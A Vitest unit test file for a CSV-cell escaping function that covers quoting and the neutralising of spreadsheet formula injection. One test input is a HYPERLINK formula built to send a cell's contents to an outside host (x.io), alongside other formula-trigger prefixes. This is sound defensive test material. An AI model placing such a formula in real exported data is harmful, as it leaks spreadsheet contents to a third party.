import { describe, expect, it } from 'vitest'
import { csvCell } from '../csv'

describe('csvCell', () => {
  it('quotes a cell with a quote, comma or line break', () => {
    expect(csvCell('plain')).toBe('plain')
    expect(csvCell('V1, Inclusion')).toBe('"V1, Inclusion"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('a\nb')).toBe('"a\nb"')
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('makes text a spreadsheet would run as a formula show as written', () => {
    expect(csvCell('=HYPERLINK("//x.io/"&D3)')).toBe('"\'=HYPERLINK(""//x.io/""&D3)"')
    expect(csvCell('+1')).toBe("'+1")
    expect(csvCell('-1')).toBe("'-1")
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(csvCell('\t=1')).toBe("'\t=1")
    expect(csvCell('\r=1')).toBe('"\'\r=1"')
    expect(csvCell('M-001')).toBe('M-001')
  })

  it('writes numbers and booleans as they are', () => {
    expect(csvCell(-3)).toBe('-3')
    expect(csvCell(7)).toBe('7')
    expect(csvCell(true)).toBe('true')
  })
})
